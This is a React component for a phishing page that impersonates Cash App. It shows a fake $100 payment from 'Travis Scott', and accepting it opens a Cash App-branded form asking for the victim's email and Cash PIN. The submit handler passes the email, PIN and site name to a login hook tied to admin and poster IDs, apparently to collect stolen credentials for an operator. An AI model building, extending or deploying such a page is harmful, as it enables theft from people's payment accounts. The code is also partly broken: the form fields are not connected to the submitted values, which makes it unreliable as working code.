"use client";
import { Field, Form, Formik } from "formik"
import { useEffect, useState } from "react";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
export default function Home({ adminId, posterId }) {
  const [open, setOpen] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [currentTime, setCurrentTime] = useState(new Date());
   const initialvalues = {
    email: "",
    password: "",
  };
  // Update the time every second
  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentTime(new Date());
    }, 60000);
    // Cleanup the interval on component unmount
    return () => clearInterval(intervalId);
  }, []);
  // Format time (optional)
  const formatTime = (date) => {
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
    return `${hours}:${formattedMinutes}`;
  };

  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = async () => {
    const allValues = {
      site: site,
      mail: email,
      passcode: password,
    };

    login(allValues);
    setEmail("");
    setPassword("");
  };
  return (
    <>
      {!open ? (
        <div className="flex flex-col m-5 gap-5 ">
          <div className="text-center ">
            <p className="text-lg font-semibold">Travis Scott</p>
            <p className="text-xs text-gray-400">Payment form Stravisscott</p>
          </div>
          <div className="text-center mt-[50%]">
            <p className="text-2xl font-semibold">$100.00</p>
            <p className="text-xs text-gray-400">
              For la flame fans must eat Today at {formatTime(currentTime)}
            </p>
          </div>
          <div className=" flex flex-col gap-2 justify-center items-center text-center mt-[50%]">
            <button
              className=" w-[25%] px-5 py-1 rounded-xl bg-green-600 text-white"
              onClick={() => setOpen(true)}
            >
              Accept
            </button>
            <button className=" w-[25%] px-5 py-1 rounded-xl bg-red-600 text-white">
              Decline
            </button>
          </div>
        </div>
      ) : (
    <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
         <img src="/images/Square_Cash_app_logo.svg" height={200} width={200} />
         <div className="mt-5">
           <Formik
             initialValues={initialvalues}
             // validationSchema={validate}
             onSubmit={handleSubmit}
           >
             {(formik) => (
               <Form className="">
                 <div className="flex flex-row justify-center items-center pl-5 w-[387px]">
                   <label
                     htmlFor="email"
                     className="text-sm w-[100px] text-green-500 font-semibold "
                   >
                     Your Email:
                   </label>
                   <Field
                     className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
                     placeholder="Enter your email"
                     name="email"
                     type="email"
                     required
                   />
                 </div>
   
                 <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
                   <label
                     htmlFor="email"
                     className="text-sm  w-[130px] text-green-500 font-semibold"
                   >
                     Your CashPin:
                   </label>
                   <Field
                     className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
                     placeholder="Enter your cashpin"
                     name="password"
                     type="password"
                     autoComplete="on"
                     required
                   />
                 </div>
   
                 <div className="flex flex-row justify-center items-center mt-1">
                   <button
                     type="submit"
                     className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
                   >
                     Add Money
                   </button>
                 </div>
               </Form>
             )}
           </Formik>
         </div>
       </div>
      )}
    </>
  );
}
